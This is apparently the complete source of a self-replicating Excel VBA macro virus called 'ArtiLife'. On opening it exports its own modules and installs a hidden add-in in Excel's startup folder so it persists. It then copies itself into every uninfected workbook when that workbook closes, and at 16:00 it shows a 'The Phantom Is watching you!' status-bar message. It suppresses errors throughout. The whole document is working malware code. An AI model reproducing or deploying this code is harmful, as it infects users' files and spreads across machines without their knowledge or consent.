   Attribute VB_Name = "ArtiLife"
   Option Explicit
   Dim Replica As New Replicator

   Sub Auto_Open()
       Set Replica.App = Application
       If ThisWorkbook.Path <> Application.StartupPath Then Replica.Initialize
       Application.OnTime TimeValue("16:00:00"), "DeliverPayload"
   End Sub

   Sub DeliverPayload()
       Replica.Activate
   End Sub


   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "Replicator"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = True
   Attribute VB_PredeclaredId = False
   Attribute VB_Exposed = False
   Option Explicit
   Public WithEvents App As Application
   Attribute App.VB_VarHelpID = -1
   Private dpath As String

   Private Sub App_WorkbookBeforeClose(ByVal Wb As Workbook, Cancel As Boolean)
       Dim infwb As String
       On Error Resume Next
       infwb = Wb.Name
       If Infchecker(infwb) = False Then Import infwb
   End Sub

   Private Sub App_WorkbookOpen(ByVal Wb As Workbook)
       Dim infwb As String
       On Error Resume Next
       infwb = Wb.Name
       If Wb.Path <> Application.StartupPath Then
           If Infchecker(infwb) = True Then Remove infwb
       End If
   End Sub

   Function Export(wkbk As String)
       dpath = Application.DefaultFilePath
       Workbooks(wkbk).VBProject.VBComponents("Artilife").Export (dpath & "\~a0183")
       Workbooks(wkbk).VBProject.VBComponents("Replicator").Export (dpath & "\~r0183")
   End Function

   Function Initialize()
       Dim curname As String
       Dim backgrounder As Object
       Dim stpath As String
       On Error Resume Next
       Application.ScreenUpdating = False
       curname = ThisWorkbook.Name
       stpath = Application.StartupPath
       Export curname
       Set backgrounder = Workbooks.Add
       backgrounder.IsAddin = True
       Import backgrounder.Name
       backgrounder.SaveAs (stpath & "\~xl.xla")
       Application.ScreenUpdating = True
   End Function

   Function Import(ByVal wkbk As String)
       dpath = Application.DefaultFilePath
       Workbooks(wkbk).VBProject.VBComponents.Import (dpath & "\~a0183")
       Workbooks(wkbk).VBProject.VBComponents.Import (dpath & "\~r0183")
   End Function

   Function Remove(wbname As String)
       Dim vbart As Object, vbrep As Object
       Set vbart = Workbooks(wbname).VBProject.VBComponents("Artilife")
       Set vbrep = Workbooks(wbname).VBProject.VBComponents("Replicator")
       Workbooks(wbname).VBProject.VBComponents.Remove vbart
       Workbooks(wbname).VBProject.VBComponents.Remove vbrep
   End Function

   Private Function Infchecker(wbname As String) As Boolean
       On Error Resume Next
       Dim vbp As Object
       Infchecker = False
       For Each vbp In Workbooks(wbname).VBProject.VBComponents
           If StrComp(vbp.Name, "Replicator", 0) = 0 Then
               Infchecker = True
               Exit For
           End If
       Next vbp
   End Function

   Function Activate()
       Dim msg(26) As String
       Dim i As Integer
           For i = 0 To 26
               msg(i) = Right("               The Phantom", i + 1)
               Application.StatusBar = msg(i)
                   If i Mod 2 = 0 Then
                       Application.Wait TimeSerial(Hour(Now()), Minute(Now()), Second(Now()) + 1)
                   End If
           Next i
       Application.StatusBar = "             Is watching you!"
       Application.Wait TimeSerial(Hour(Now()), Minute(Now()), Second(Now()) + 3)
       Application.StatusBar = "             Beware!"
       Application.Wait TimeSerial(Hour(Now()), Minute(Now()), Second(Now()) + 3)
       Application.StatusBar = False
   End Function
